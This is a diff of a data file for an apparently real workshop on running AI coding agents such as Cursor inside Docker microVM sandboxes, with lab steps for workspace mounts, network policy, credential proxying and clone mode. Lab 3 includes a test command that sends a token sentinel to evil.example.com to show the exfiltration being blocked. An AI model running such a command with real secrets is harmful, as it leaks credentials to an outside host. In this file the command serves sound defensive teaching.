@@ -1,4 +1,5 @@
 import { WORKSHOP_LAB_IDS } from "@/lib/labs";
+import { sandboxDocs } from "@/lib/learning-data";
 
 export const workshop = {
   title: "Run AI Agents Safely with Docker Sandboxes",
@@ -29,8 +30,16 @@ export const agenda = [
   { time: "0:00", title: "Welcome & the YOLO problem", duration: "10 min" },
   { time: "0:10", title: "Lab 1 — First sandbox", duration: "25 min" },
   { time: "0:35", title: "Lab 2 — Network policy", duration: "35 min" },
-  { time: "1:15", title: "Lab 3 — Secrets & credential isolation", duration: "20 min" },
-  { time: "1:35", title: "Labs 4–10 — self-paced (clone, app, kits, capstone)", duration: "25+ min" },
+  {
+    time: "1:15",
+    title: "Lab 3 — Secrets & credential isolation",
+    duration: "20 min",
+  },
+  {
+    time: "1:35",
+    title: "Labs 4–10 — self-paced (clone, app, kits, capstone)",
+    duration: "25+ min",
+  },
   { time: "1:50", title: "Q&A", duration: "10 min" },
 ] as const;
 
@@ -53,7 +62,8 @@ export const isolationLayers = [
   },
   {
     name: "Credential proxy",
-    description: "API keys injected on outbound HTTPS — never stored in the VM.",
+    description:
+      "API keys injected on outbound HTTPS — never stored in the VM.",
   },
 ] as const;
 
@@ -61,31 +71,40 @@ export const labs = [
   {
     id: "lab-01",
     title: "Run Your First Sandbox",
-    time: "25 min",
+    time: "5 min",
     folder: "lab-01-first-sandbox",
     githubPath: "lab-01-first-sandbox",
-    description: "Install sbx, boot Claude Code in a microVM, create files in the workspace, and tear down.",
+    description:
+      "Install sbx, boot Cursor in a microVM, create files in the workspace, and tear down.",
+    docsLinks: [
+      { label: "Get started", href: sandboxDocs.getStarted },
+      { label: "Cursor agent", href: sandboxDocs.cursor },
+      { label: "Usage", href: sandboxDocs.usage },
+      { label: "Architecture", href: sandboxDocs.architecture },
+      { label: "sbx CLI", href: sandboxDocs.cli },
+    ],
     task: `1. Install the sbx CLI and verify the version.
 2. Sign in with sbx login.
-3. cd into lab-01-first-sandbox/workspace/ and start Claude with sbx run claude . --name my-sandbox.
-4. Ask the agent to create hello.txt in the workspace and show its contents.
-5. Ask the agent to delete ../delete-me.txt and observe why that fails outside the workspace mount.
-6. From a second host terminal, inspect the sandbox with sbx ls and sbx exec.
+3. Store your Cursor API key on the host with sbx secret set -g cursor — never put it in a file in this repo.
+4. cd into lab-01-first-sandbox/workspace/ and start Cursor with sbx run cursor . --name my-sandbox.
+5. Ask the agent to create hello.txt in the workspace and show its contents.
+6. Ask the agent to delete ../delete-me.txt and observe why that fails outside the workspace mount.
 7. Review sbx policy log and remove the sandbox with sbx rm.
 
-Done when hello.txt exists in workspace/ on the host, delete-me.txt is still present at the lab root, sbx exec shows a VM kernel different from your host, and sbx rm removes my-sandbox from sbx ls.`,
+Done when Cursor starts without an API key error, hello.txt exists in workspace/ on the host, delete-me.txt is still present at the lab root, and sbx rm removes my-sandbox from sbx ls.`,
     hints: [
       "Work from lab-01-first-sandbox/workspace/ — mounting the repo root is the most common mistake.",
-      "Open a second terminal on the host for sbx ls, sbx exec, and sbx policy log while the agent runs.",
       "delete-me.txt lives one level above workspace/ — the sandbox only syncs the workspace folder, so the agent cannot remove host files outside that mount.",
-      "There is no sbx status — use sbx ls. Success for uname: VM kernel ≠ host kernel.",
-      "If Claude won't start: run sbx login and sbx secret set -g anthropic on the host first.",
+      "There is no sbx status — use sbx ls when cleaning up.",
+      "If Cursor exits with a CURSOR_API_KEY error: unset CURSOR_API_KEY in your shell, run sbx secret set -g cursor again, then start a new sandbox — global secrets apply at create time.",
+      "Create a Cursor API key in Cursor Settings → API. Paste it when sbx secret set -g cursor prompts — it stays in the OS keychain, not in the repo.",
     ],
     steps: [
       {
         label: "Install sbx",
         task: "Trust Docker's Homebrew tap, install sbx, and print the CLI version. Expect a version string with no errors.",
-        command: "brew trust docker/tap\nbrew install docker/tap/sbx\nsbx version",
+        command:
+          "brew trust docker/tap\nbrew install docker/tap/sbx\nsbx version",
       },
       {
         label: "Sign in",
@@ -93,28 +112,28 @@ Done when hello.txt exists in workspace/ on the host, delete-me.txt is still pre
         command: "sbx login",
       },
       {
-        label: "Start sandbox",
-        task: "Change into workspace/, then boot Claude Code in a named sandbox. Leave this terminal on the agent — use another terminal for host commands.",
+        label: "Cursor API key",
+        task: "Store your Cursor API key on the host with sbx secret set -g cursor before starting the agent. Expect sbx secret ls to list (global) service cursor. If the agent reports a bad CURSOR_API_KEY from your environment, unset it and store the key again, then create a fresh sandbox.",
         command:
-          "cd lab-01-first-sandbox/workspace\nsbx run claude . --name my-sandbox",
+          "sbx secret set -g cursor\nsbx secret ls\n\n# If a stale shell export causes errors:\n# unset CURSOR_API_KEY\n# sbx secret set -g cursor",
+      },
+      {
+        label: "Start sandbox",
+        task: "Change into workspace/, then boot Cursor in a named sandbox. Use a second host terminal only for clean up at the end.",
+        command:
+          "cd lab-01-first-sandbox/workspace\nsbx run cursor . --name my-sandbox",
       },
       {
         label: "Create hello.txt",
-        task: 'In Claude, paste this prompt: "Create a file named hello.txt in this workspace with a one-line greeting, then show me the file contents." Expect hello.txt to appear in workspace/ on the host.',
+        task: 'In Cursor, paste this prompt: "Create a file named hello.txt in this workspace with a one-line greeting, then show me the file contents." Expect hello.txt to appear in workspace/ on the host.',
         command:
-          '# Claude prompt:\nCreate a file named hello.txt in this workspace with a one-line greeting, then show me the file contents.',
+          "# Cursor prompt:\nCreate a file named hello.txt in this workspace with a one-line greeting, then show me the file contents.",
       },
       {
         label: "Workspace boundary",
-        task: 'In Claude, paste this prompt: "Try to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host." Expect the file to remain — the agent cannot delete paths outside the synced workspace/.',
+        task: 'In Cursor, paste this prompt: "Try to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host." Expect the file to remain — the agent cannot delete paths outside the synced workspace/.',
         command:
-          '# Claude prompt:\nTry to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host.',
-      },
-      {
-        label: "Inspect from host",
-        task: "On the host, confirm my-sandbox is running, read hello.txt from inside the VM, and compare the kernel. Expect hello.txt contents and a kernel string different from your laptop.",
-        command:
-          "sbx ls\nsbx exec my-sandbox -- cat hello.txt\nsbx exec my-sandbox -- uname -r",
+          "# Cursor prompt:\nTry to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host.",
       },
       {
         label: "Clean up",
@@ -126,215 +145,313 @@ Done when hello.txt exists in workspace/ on the host, delete-me.txt is still pre
   {
     id: "lab-02",
     title: "Network Policy",
-    time: "35 min",
+    time: "10 min",
     folder: "lab-02-network-policy",
     githubPath: "lab-02-network-policy",
-    description: "Create a sandbox, prove deny-by-default networking, allow npmjs.com, and manage rules.",
-    task: `1. cd into lab-02-network-policy/ and create a shell sandbox named lab2.
-2. Initialize the balanced network policy profile on the host.
-3. From inside the sandbox, curl https://www.npmjs.com and https://npmjs.org — both should be blocked.
-4. Allow www.npmjs.com, curl again, and confirm the registry responds.
-5. Ask the agent what the latest eslint version on npmjs.com is and verify it can read the registry.
-6. Inspect active network rules scoped to lab2 with sbx policy ls.
-7. Deny www.npmjs.com again and confirm curl is blocked.
-8. Remove the www.npmjs.com network rule with sbx policy rm.
-9. Remove the sandbox when finished.
+    description:
+      "Create a sandbox, prove deny-by-default networking, allow www.dockerfrontend.com, and manage sandbox-scoped rules.",
+    docsLinks: [
+      { label: "Network policy", href: sandboxDocs.governance },
+      { label: "Security", href: sandboxDocs.security },
+      { label: "sbx CLI", href: sandboxDocs.cli },
+    ],
+    task: `1. On the host, initialize global balanced policy with sbx policy init balanced. If already initialized, run sbx policy reset first, then init again.
+2. cd into lab-02-network-policy/workspace/ and start Cursor with sbx run cursor . --name lab2.
+3. Ask Cursor to curl https://www.dockerfrontend.com, show the response, and confirm it is blocked. Validate with sbx policy log lab2.
+4. Allow www.dockerfrontend.com on the host, ask Cursor to curl again and show more about the book. Check sbx policy log.
+5. Ask the agent to list Docker books on the site with titles and descriptions.
+6. Inspect rules with sbx policy ls --type network lab2 (UUID in POLICY/RULE column) and validate traffic with sbx policy log.
+7. Deny www.dockerfrontend.com for lab2 only. If a rule already exists, remove it first with sbx policy rm network --id <uuid> --sandbox lab2 (UUID from sbx policy ls, not sbx policy log).
+8. Remove sandbox-scoped and global network rules by ID or resource with sbx policy rm, then remove the sandbox.
 
-Done when sbx policy log shows blocked and allowed requests, curl to www.npmjs.com succeeds only while the host is allowed, eslint version is retrieved while allowed, and sbx policy ls reflects each rule change.`,
+Done when Cursor shows blocked and allowed responses, sbx policy log confirms each block and allow for www.dockerfrontend.com, sandbox-scoped deny blocks the host again for lab2, and sbx policy ls reflects each rule change.`,
     hints: [
-      "Run commands from lab-02-network-policy/ unless noted — workspace/ is only the mount path for sbx create shell workspace.",
-      "Under balanced policy, npm registry hosts are blocked until you explicitly allow them.",
-      "HTTP 403 or connection failure on curl means the deny rule worked — not a successful page load.",
-      "Use sbx policy ls lab2 to inspect rules for this sandbox plus global rules.",
-      "Remove rules with sbx policy rm network --resource <host> when you are done experimenting.",
+      "Run sbx policy init balanced on the host before sbx run cursor — the sandbox inherits global policy at start.",
+      "If init fails with already initialized, run sbx policy reset then sbx policy init balanced again.",
+      "Work from lab-02-network-policy/workspace/. Use a second host terminal for sbx policy commands and sbx policy log.",
+      "Under balanced policy, www.dockerfrontend.com is blocked until you explicitly allow it.",
+      "Ask Cursor to curl and show the full response — a blocked request or policy error means deny worked.",
+      "Block a host for one sandbox only: sbx policy deny network --sandbox lab2 ads.example.com",
+      "Revoke access for this lab's site: sbx policy deny network --sandbox lab2 www.dockerfrontend.com",
+      "Validate blocks and allows on the host with sbx policy log lab2 — shows traffic (HOST, PROXY, RULE), not rule IDs.",
+      "Find rule IDs with sbx policy ls --type network lab2 — user-added rules show a UUID in the POLICY/RULE column.",
+      "Rules are not updated in place — remove the existing rule first (by ID or --resource), then apply the new one.",
+      "Remove by ID: sbx policy rm network --id <uuid> --sandbox lab2 (UUID from POLICY/RULE column in sbx policy ls).",
+      "Remove by resource: sbx policy rm network --sandbox lab2 --resource www.dockerfrontend.com",
     ],
     steps: [
       {
-        label: "Create sandbox",
-        task: "Change to the lab folder and create a named shell sandbox with the workspace mount. Expect lab2 to appear in sbx ls.",
+        label: "Init balanced policy",
+        task: "On the host, set global balanced policy before starting any sandbox. If you see already initialized, reset first, then init again. Expect sbx policy ls to show balanced defaults.",
         command:
-          "cd lab-02-network-policy\nsbx create shell workspace --name lab2 -q",
+          "sbx policy init balanced\nsbx policy ls\n\n# If already initialized:\nsbx policy reset\nsbx policy init balanced\nsbx policy ls",
       },
       {
-        label: "Init balanced policy",
-        task: "Initialize the balanced policy profile on the host (once per machine). Expect sbx policy ls to show the balanced defaults.",
-        command: "sbx policy init balanced",
+        label: "Start sandbox",
+        task: "Change into workspace/, then boot Cursor with --name lab2. Leave this terminal on the agent; use another terminal for sbx policy commands and sbx policy log.",
+        command:
+          "cd lab-02-network-policy/workspace\nsbx run cursor . --name lab2",
       },
       {
         label: "Prove default deny",
-        task: "Curl both npmjs hostnames from inside the sandbox before any allow rule. Expect non-200 responses or blocked connections — not a normal registry page.",
+        task: "Before any allow rule, ask Cursor to curl www.dockerfrontend.com, show the full response, and confirm the URL is blocked by policy. On the host, run sbx policy log lab2 and expect a blocked entry.",
         command:
-          'sbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://www.npmjs.com\nsbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://npmjs.org',
+          "# Cursor prompt:\ncurl https://www.dockerfrontend.com and show me the full response (status code and body). Confirm this URL is blocked by sandbox network policy.\n\n# Validate on the host:\nsbx policy log lab2 --limit 10",
       },
       {
-        label: "Allow www.npmjs.com",
-        task: "Allow outbound HTTPS to www.npmjs.com, then curl it again from the sandbox. Expect HTTP 200 (or another success code) this time.",
+        label: "Allow www.dockerfrontend.com",
+        task: "On the host, allow outbound HTTPS to www.dockerfrontend.com. Ask Cursor to curl again and show more about the book on the site. Check sbx policy log — expect an allowed entry.",
         command:
-          'sbx policy allow network www.npmjs.com\nsbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://www.npmjs.com',
+          "sbx policy allow network www.dockerfrontend.com\n\n# Cursor prompt:\ncurl https://www.dockerfrontend.com again and show me more about the book — title, description, and what you find on the page.\n\n# Validate on the host:\nsbx policy log lab2 --limit 10",
       },
       {
-        label: "Query eslint version",
-        task: 'With www.npmjs.com allowed, ask the agent: "What is the latest eslint version published on npmjs.com? Fetch the registry and cite the version." Expect a current eslint version. Verify with sbx exec lab2 -- curl -s https://registry.npmjs.org/eslint/latest if needed.',
+        label: "Read the site",
+        task: "With www.dockerfrontend.com allowed, ask the agent to list the Docker books on the homepage — titles and short descriptions for each.",
         command:
-          '# Claude prompt:\nWhat is the latest eslint version published on npmjs.com? Fetch the registry and cite the version.\n\n# Verify from the host:\nsbx exec lab2 -- curl -s https://registry.npmjs.org/eslint/latest',
+          "# Cursor prompt:\nList the Docker books on www.dockerfrontend.com — give me the title and a short description for each one you find.",
       },
       {
         label: "Inspect policy",
-        task: "List network rules visible to lab2. Expect your allow entry for www.npmjs.com plus the balanced defaults.",
-        command: "sbx policy ls lab2\nsbx policy log lab2 --limit 10",
+        task: "sbx policy log lab2 shows traffic audit (HOST, PROXY, RULE) — no IDs. To find rule IDs, run sbx policy ls --type network lab2 — user-added rules show a UUID in the POLICY/RULE column (e.g. 2ed35442-ebf3-4a92-a11e-56cb143969af for www.dockerfrontend.com). Copy that UUID to remove or replace a rule.",
+        command:
+          "# Traffic audit — validates blocked/allowed requests (no rule IDs):\nsbx policy log lab2 --limit 10\n\n# Rule definitions — UUID in POLICY/RULE column:\nsbx policy ls --type network lab2 | grep dockerfrontend\n\n# Example row:\n# local  sandbox:lab2  2ed35442-ebf3-4a92-a11e-56cb143969af  network  allow  www.dockerfrontend.com\n\n# Remove by ID:\n# sbx policy rm network --id 2ed35442-ebf3-4a92-a11e-56cb143969af --sandbox lab2",
       },
       {
-        label: "Deny again",
-        task: "Block www.npmjs.com again and confirm curl fails. Expect the request to be denied as before.",
+        label: "Sandbox-scoped deny",
+        task: "On the host, block www.dockerfrontend.com for lab2 only. If a rule already exists for this host, remove it first — find the UUID in sbx policy ls --type network lab2 (POLICY/RULE column), then sbx policy rm network --id <uuid> --sandbox lab2. Apply the new deny, ask Cursor to curl, and validate with sbx policy log.",
         command:
-          'sbx policy deny network www.npmjs.com\nsbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://www.npmjs.com',
+          "# Find the rule UUID (POLICY/RULE column):\nsbx policy ls --type network lab2 | grep dockerfrontend\n\n# Remove existing rule before changing allow/deny:\n# sbx policy rm network --id 2ed35442-ebf3-4a92-a11e-56cb143969af --sandbox lab2\n\nsbx policy deny network --sandbox lab2 www.dockerfrontend.com\n\n# Cursor prompt:\ncurl https://www.dockerfrontend.com again and show the response. Confirm the request is blocked by policy again.\n\n# Validate traffic on the host:\nsbx policy log lab2 --limit 10",
       },
       {
-        label: "Remove rule",
-        task: "Remove the www.npmjs.com network resource from policy, then tear down sandboxes. Expect sbx policy ls to no longer list that host.",
+        label: "Remove rules",
+        task: "Remove sandbox-scoped and global network rules for www.dockerfrontend.com, then tear down. Find UUIDs with sbx policy ls --type network lab2 (POLICY/RULE column), or remove by --resource. Expect sbx policy ls to no longer list those hosts.",
         command:
-          'sbx policy rm network --resource www.npmjs.com\nsbx rm lab2 --force',
+          'sbx policy ls --type network lab2 | grep -E "dockerfrontend|kristiyanvelkov"\n\n# Remove by ID (UUID from POLICY/RULE column):\nsbx policy rm network --id <uuid> --sandbox lab2\n\n# Or remove by resource:\nsbx policy rm network --sandbox lab2 --resource www.dockerfrontend.com\nsbx policy rm network --resource www.dockerfrontend.com\nsbx rm lab2 --force',
       },
     ],
   },
   {
     id: "lab-03",
     title: "Secrets · Security",
-    time: "20 min",
+    time: "10 min",
     folder: "lab-03-secrets",
     githubPath: "lab-03-secrets",
-    description: "Store credentials on the host, verify sentinel values inside the VM, and confirm proxy injection.",
-    task: `1. Store your real Anthropic key on the host with sbx secret set -g anthropic — never put it in a file in this repo.
-2. cd into lab-03-secrets/workspace/ and start sbx run claude . --name lab3.
-3. From a second terminal, echo $ANTHROPIC_API_KEY inside the VM — output must be proxy-managed, never sk-ant-….
-4. curl the Anthropic API from inside the VM and confirm HTTP 200.
+    description:
+      "Store a GitHub token on the host, verify the sentinel inside the VM, and confirm proxy injection for api.github.com.",
+    docsLinks: [
+      { label: "Credential proxy", href: sandboxDocs.credentials },
+      { label: "Authenticated CLI", href: sandboxDocs.workflowsAuthCli },
+      { label: "Security", href: sandboxDocs.security },
+      { label: "Network policy", href: sandboxDocs.governance },
+    ],
+    task: `1. Run gh auth status, then pipe your GitHub token to sbx secret set -g github on the host — never put it in a file in this repo.
+2. cd into lab-03-secrets/workspace/ and start sbx run cursor . --name lab3.
+3. From a second terminal, echo $GH_TOKEN inside the VM — expect a proxy sentinel like gho_sbxproxymanaged…, not your real token. GITHUB_TOKEN is usually unset.
+4. curl api.github.com/user from inside the VM using $GH_TOKEN and confirm HTTP 200.
 5. Attempt to exfiltrate the sentinel to a blocked host — expect the request to fail.
 6. Remove the sandbox with sbx rm lab3.
 
-Done when the sentinel value appears in the VM, the API check returns HTTP 200, exfiltration is blocked, and your real key never appears in terminal output inside the sandbox.`,
+Done when GH_TOKEN shows a proxy sentinel (gho_sbxproxymanaged…), the GitHub API check returns HTTP 200, exfiltration is blocked, and your real token never appears in terminal output inside the sandbox.`,
     hints: [
-      "Use a valid Anthropic key — dummy keys show proxy-managed but the API check returns 401.",
+      "Requires gh CLI logged in — run gh auth status before sbx secret set -g github.",
+      "Store the GitHub secret on the host before sbx run — global secrets apply when the sandbox is created.",
+      'Never commit tokens — echo "$(gh auth token)" | sbx secret set -g github stores it on the host only.',
+      "The proxy sets GH_TOKEN in the VM — GITHUB_TOKEN is usually unset. Use echo $GH_TOKEN, not GITHUB_TOKEN.",
+      "Expected sentinel: gho_sbxproxymanaged… — a placeholder shaped like a token, not your real gho_… value from gh auth token.",
       "API verification must run via sbx exec lab3 — not on the host.",
-      "If lab3 does not exist yet: start it with sbx run claude . --name lab3 from workspace/ first.",
+      "If lab3 does not exist yet: start it with sbx run cursor . --name lab3 from workspace/ first.",
+      "Cursor still needs sbx secret set -g cursor from Lab 1 — this lab focuses on the GitHub token proxy.",
       "The exfiltration curl to evil.example.com should be blocked by network policy — the sentinel never leaves via an unapproved host.",
     ],
     steps: [
       {
         label: "Store on host",
-        task: "Run sbx secret set on the host and paste your key when prompted. Expect the key to stay in the OS keychain — not in the repo.",
-        command: "sbx secret set -g anthropic\nsbx secret ls",
+        task: "Run gh auth status, then pipe your GitHub token to sbx secret set -g github. Expect the token to stay in the OS keychain — not in the repo.",
+        command:
+          'gh auth status\necho "$(gh auth token)" | sbx secret set -g github\nsbx secret ls',
       },
       {
         label: "Start sandbox",
-        task: "From lab-03-secrets/workspace/, boot Claude in a named sandbox. Leave this terminal on the agent — use another terminal for sbx exec checks.",
-        command: "cd lab-03-secrets/workspace\nsbx run claude . --name lab3",
+        task: "From lab-03-secrets/workspace/, boot Cursor in a named sandbox. Leave this terminal on the agent — use another terminal for sbx exec checks.",
+        command: "cd lab-03-secrets/workspace\nsbx run cursor . --name lab3",
       },
       {
         label: "Check sentinel",
-        task: "Echo ANTHROPIC_API_KEY inside the running sandbox. Expect exactly proxy-managed — if you see sk-ant-…, stop and fix your secret setup.",
-        command: 'sbx exec lab3 -- bash -c \'echo "$ANTHROPIC_API_KEY"\'',
+        task: "Echo GH_TOKEN inside the running sandbox. Expect a proxy sentinel like gho_sbxproxymanaged… — not your real token from gh auth token. GITHUB_TOKEN is usually unset; the proxy wires GitHub auth through GH_TOKEN.",
+        command:
+          'sbx exec lab3 -- bash -c \'echo "GH_TOKEN=$GH_TOKEN"\'\nsbx exec lab3 -- bash -c \'test -z "$GITHUB_TOKEN" && echo "GITHUB_TOKEN unset (expected)" || echo "GITHUB_TOKEN=$GITHUB_TOKEN"\'',
       },
       {
         label: "Verify proxy",
-        task: "Confirm the sentinel, then curl the Anthropic API from inside the VM. Expect HTTP 200 — the host proxy injects your real key on the way out.",
+        task: "Confirm GH_TOKEN contains sbxproxymanaged, then curl the GitHub API from inside the VM. Expect HTTP 200 — the host proxy injects your real token on the way out.",
         command:
-          'sbx exec lab3 -- bash -c \'test "$ANTHROPIC_API_KEY" = "proxy-managed"\'\nsbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" https://api.anthropic.com/v1/messages -H "Content-Type: application/json" -H "x-api-key: $ANTHROPIC_API_KEY" -H "anthropic-version: 2023-06-01" -d "{\\"model\\":\\"claude-3-5-haiku-latest\\",\\"max_tokens\\":1,\\"messages\\":[{\\"role\\":\\"user\\",\\"content\\":\\"hi\\"}]}"',
+          'sbx exec lab3 -- bash -c \'echo "$GH_TOKEN" | grep -q sbxproxymanaged && echo "sentinel OK"\'\nsbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user',
       },
       {
         label: "Block exfiltration",
         task: "Try sending the sentinel to a blocked host from inside the VM. Expect the curl to fail — network policy blocks unapproved destinations.",
         command:
-          'sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" "https://evil.example.com?k=$ANTHROPIC_API_KEY"',
+          'sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" "https://evil.example.com?k=$GH_TOKEN"',
       },
       {
         label: "Clean up",
         task: "Remove sandbox lab3 when verification passes. On shared machines, also run sbx secret rm after the lab.",
-        command: "sbx rm lab3 --force\nsbx secret rm -g anthropic --force",
+        command: "sbx rm lab3 --force\nsbx secret rm -g github --force",
       },
     ],
   },
   {
     id: "lab-04",
-    title: "Clone Mode · Git Workflow",
+    title: "Direct & Clone Mode",
     time: "15 min",
     folder: "lab-04-clone-workflow",
     githubPath: "lab-04-clone-workflow",
-    description: "Clone-mode sandbox, agent commits on a test branch, fetch on the host.",
-    task: `1. Ensure workshop-app/.env.local exists (copy from .env.example and add Supabase keys).
-2. sbx run --clone cursor workshop-app/ with the workshop kit as workshop-clone.
-3. Ask the agent to create branch feat/workshop-test, add a one-line comment to workshop-data.ts, and commit.
-4. On the host, run git fetch sandbox-workshop-clone and review the diff.
-5. Remove the sandbox with sbx rm workshop-clone.
+    description:
+      "Clone the workshop repo, validate workshop-app locally, then compare direct and clone mode in sbx.",
+    docsLinks: [
+      { label: "Workflow patterns", href: sandboxDocs.workflows },
+      { label: "Clone mode", href: sandboxDocs.workflowsCloneMode },
+      { label: "Git workflows", href: sandboxDocs.workflowsGit },
+    ],
+    task: `1. Clone https://github.com/kristiyan-velkov/docker-sandbox-workshop and cd into workshop-app/.
+2. Run npm install and npm run dev on the host — confirm http://localhost:3000 loads, then stop the dev server.
+3. From the workshop monorepo root, start Cursor in direct mode: sbx run cursor workshop-app/ --name lab4-direct.
+4. Ask the agent to change the landing hero tagline in src/components/home-hero.tsx. Confirm the edit appears on the host immediately.
+5. Remove lab4-direct with sbx rm.
+6. Start Cursor in clone mode: sbx run --clone cursor workshop-app/ --name lab4-clone.
+7. Ask the agent to create branch feat/lab4-test, add a one-line comment to src/lib/workshop-data.ts, and commit.
+8. On the host (monorepo root), run git fetch sandbox-lab4-clone and review the diff — expect git status to stay clean.
+9. Remove lab4-clone and the sandbox remote.
 
-Done when host git status is still clean, git log sandbox-workshop-clone/feat/workshop-test shows the agent commit, and you reviewed the diff before merging anything.`,
+Done when the app runs locally on the host, direct-mode edits show on the host right away, clone-mode commits appear only after git fetch sandbox-lab4-clone, and your host working tree stayed clean during clone mode.`,
     hints: [
-      "Run every sbx command from the repository root — kit path ./customize/kit/… is relative to root.",
-      "Clone mode gives the VM its own Git copy — your host main branch stays untouched until you fetch.",
-      "After fetch, the remote is named sandbox-workshop-clone (pattern: sandbox-<your --name>).",
-      "Agent prompt: \"Create branch feat/workshop-test, add a comment to workshop-data.ts, commit, and tell me the branch name.\"",
+      "Clone the workshop repo first: git clone https://github.com/kristiyan-velkov/docker-sandbox-workshop",
+      "Validate on the host before sbx — cd workshop-app, npm install, npm run dev, open http://localhost:3000.",
+      "Run sbx commands from the monorepo root with workshop-app/ as the workspace path.",
+      "Direct mode (default) — read-write access to your working tree. Agent changes appear on the host immediately.",
+      "Clone mode (--clone) — private Git clone in the VM; host repo mounted read-only. Fetch commits from sandbox-<name> like any remote.",
+      "Clone mode is set at create time only — you cannot add --clone to an existing sandbox.",
+      "No kit or Supabase setup needed for this lab.",
+      "After clone mode, the remote is sandbox-lab4-clone (pattern: sandbox-<your --name>).",
+      'Agent prompt (direct): "Update the hero tagline in src/components/home-hero.tsx to mention Docker Sandboxes."',
+      'Agent prompt (clone): "Create branch feat/lab4-test, add a one-line comment at the top of src/lib/workshop-data.ts, commit, and tell me the branch name."',
     ],
     steps: [
       {
-        label: "Clone sandbox",
-        task: "Launch Cursor in clone mode on workshop-app/ with the Next.js kit. Wait until the agent session is ready before prompting.",
+        label: "Clone workshop repo",
+        task: "Download the workshop monorepo from GitHub. You will work inside workshop-app/ for local validation and sandbox runs.",
         command:
-          "sbx run --clone cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs --name workshop-clone",
+          "git clone https://github.com/kristiyan-velkov/docker-sandbox-workshop.git\ncd docker-sandbox-workshop",
       },
       {
-        label: "Fetch branch",
-        task: "On the host (new terminal, repo root): fetch commits from the sandbox clone. Expect new refs under sandbox-workshop-clone/.",
-        command: "git fetch sandbox-workshop-clone",
+        label: "Validate locally",
+        task: "Install dependencies and start the dev server on the host. Open http://localhost:3000 — expect the site to load. Stop the server (Ctrl+C) before starting sbx.",
+        command:
+          "cd workshop-app\nnpm install\nnpm run dev\n\n# Confirm http://localhost:3000 in your browser, then Ctrl+C",
       },
       {
-        label: "Review diff",
-        task: "Compare main to the agent branch before merging. Read every changed line — do not merge blindly.",
-        command: "git diff main..sandbox-workshop-clone/feat/workshop-test",
+        label: "Direct mode",
+        task: "From the monorepo root, boot Cursor on workshop-app/ without --clone. The sandbox mounts your working tree read-write — edits sync to the host immediately.",
+        command: "cd ..\nsbx run cursor workshop-app/ --name lab4-direct",
       },
       {
-        label: "Clean up",
-        task: "Remove the sandbox when review is done. Optionally delete the sandbox-workshop-clone remote with git remote remove.",
-        command: "sbx rm workshop-clone --force",
+        label: "Edit on host",
+        task: "In Cursor, ask the agent to update the hero tagline in src/components/home-hero.tsx. Open the file on the host — the change should already be there before you fetch anything.",
+        command:
+          "# Cursor prompt:\nUpdate the hero tagline in src/components/home-hero.tsx to mention Docker Sandboxes. Show me the new line.",
+      },
+      {
+        label: "Clean up direct",
+        task: "Remove the direct-mode sandbox when done comparing behavior.",
+        command: "sbx rm lab4-direct --force",
+      },
+      {
+        label: "Clone mode",
+        task: "From the monorepo root, start a new sandbox with --clone on workshop-app/. The agent gets a private Git clone; your host working tree stays read-only and untouched.",
+        command: "sbx run --clone cursor workshop-app/ --name lab4-clone",
+      },
+      {
+        label: "Agent commits",
+        task: "Ask the agent to branch, edit, and commit inside the VM clone. Host git status should remain clean while the agent works.",
+        command:
+          '# Cursor prompt:\nCreate branch feat/lab4-test. Add a one-line comment at the top of src/lib/workshop-data.ts noting this was edited in clone mode. Commit with message "docs: clone mode test".',
+      },
+      {
+        label: "Fetch on host",
+        task: "On the host (monorepo root): fetch the sandbox clone and review before merging. Expect refs under sandbox-lab4-clone/.",
+        command:
+          "git fetch sandbox-lab4-clone\ngit log sandbox-lab4-clone/feat/lab4-test --oneline -3\ngit diff main..sandbox-lab4-clone/feat/lab4-test\ngit status",
+      },
+      {
+        label: "Clean up clone",
+        task: "Remove the clone-mode sandbox and optional Git remote when review is done.",
+        command:
+          "sbx rm lab4-clone --force\ngit remote remove sandbox-lab4-clone 2>/dev/null || true",
       },
     ],
   },
   {
     id: "lab-05",
-    title: "Run workshop-app",
+    title: "Run with Kit",
     time: "20 min",
     folder: "lab-05-workshop-app",
     githubPath: "lab-05-workshop-app",
-    description: "Build template, stack kit mixin, verify Next.js dev server.",
-    task: `1. Copy workshop-app/.env.example to .env.local and add your Supabase keys.
-2. Build and sbx template load workshop-app-cursor:v1.
-3. sbx run with --template and --kit as workshop-ui.
-4. curl http://127.0.0.1:3000 inside the VM and expect HTTP 200.
-5. Open the forwarded URL from sbx ls in your browser.
+    description:
+      "Boot the platform site with a kit mixin — local path first, then the same kit from a Git URL.",
+    docsLinks: [
+      { label: "Customize", href: sandboxDocs.customize },
+      { label: "Kits", href: sandboxDocs.kits },
+      { label: "Usage", href: sandboxDocs.usage },
+      { label: "Cursor agent", href: sandboxDocs.cursor },
+    ],
+    task: `1. From the repository root, run sbx run cursor . with the workshop kit from a local path.
+2. curl http://127.0.0.1:3000 inside the VM and expect HTTP 200. Check forwarded port with sbx ls.
+3. Remove the sandbox.
+4. Run again with the same kit pulled from Git (git+https://…#dir=customize/kit/workshop-app-nextjs).
+5. Verify HTTP 200 again, then tear down.
 
-Done when curl prints 200 and the workshop site loads in the browser.`,
+Done when both runs start the dev server, curl returns 200, and you understand local vs Git kit paths.`,
     hints: [
-      "Template = custom agent Docker image. Kit = spec that runs npm ci, starts dev server, and opens network ports.",
-      "Build the template once — subsequent runs reuse workshop-app-cursor:v1 until you rebuild.",
-      "sbx ls shows forwarded ports (e.g. localhost:PORT → 3000). Use that URL in your browser.",
-      "Kit-only fallback: skip --template and use sbx run cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs.",
